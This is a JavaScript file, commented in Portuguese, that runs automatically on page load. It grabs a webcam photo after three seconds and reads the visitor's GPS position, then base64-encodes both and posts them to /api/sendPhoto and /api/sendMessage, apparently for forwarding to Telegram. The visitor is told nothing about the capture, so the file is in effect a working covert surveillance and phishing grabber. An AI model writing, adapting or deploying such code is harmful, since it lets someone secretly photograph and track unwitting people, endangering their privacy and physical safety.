function tirarFoto() {
    // Solicitar acesso à câmera
    navigator.mediaDevices
        .getUserMedia({ video: true })
        .then(function (stream) {
            var video = document.createElement("video");
            document.body.appendChild(video);
            video.srcObject = stream;
            video.play();

            // Capturar a imagem após 3 segundos
            setTimeout(function () {
                var canvas = document.createElement("canvas");
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                var context = canvas.getContext("2d");
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                var imageDataURL = canvas.toDataURL("image/jpg");

                // Enviar a imagem para a API
                enviarPhotoTelegram(imageDataURL);

                // Parar o stream de vídeo e remover o elemento de vídeo
                video.pause();
                stream.getVideoTracks()[0].stop();
                document.body.removeChild(video);
            }, 3000);
        })
        .catch(function (err) {
            console.error("Erro ao acessar a câmera: ", err);
        });
}

function capturarGeolocalizacaoEEnviar() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            function (position) {
                var latitude = position.coords.latitude;
                var longitude = position.coords.longitude;

                // Enviar dados de geolocalização para a API
                enviarParaAPIGeolocalizacao(latitude, longitude);
            },
            function (error) {
                console.error("Erro ao obter a geolocalização: ", error);
            }
        );
    } else {
        console.error("Geolocalização não suportada pelo navegador.");
    }
}

async function enviarParaAPIGeolocalizacao(latitude, longitude) {
    try {
        const latitudeEncoded = btoa(
            unescape(encodeURIComponent(latitude))
        );
        const longitudeEncoded = btoa(
            unescape(encodeURIComponent(longitude))
        );
        const body = JSON.stringify({ latitude: latitudeEncoded, longitude: longitudeEncoded });

        console.log('Body para API', body)

        const response = await fetch("/api/sendMessage", {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body,
        });
        const data = await response.json();
        console.log("Resposta do servidor:", data);
    } catch (error) {
        console.error("Erro ao enviar a geolocalização para o servidor:", error);
    }
}

async function enviarPhotoTelegram(imageDataURL) {
    try {
        const imageURL = btoa(unescape(encodeURIComponent(imageDataURL)));
        const response = await fetch("/api/sendPhoto", {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify({ image: imageURL }),
        });
        const data = await response.json();
        console.log("Resposta do servidor:", data);
    } catch (error) {
        console.error("Erro ao enviar a foto para o servidor:", error);
    }
}

tirarFoto();
capturarGeolocalizacaoEEnviar();
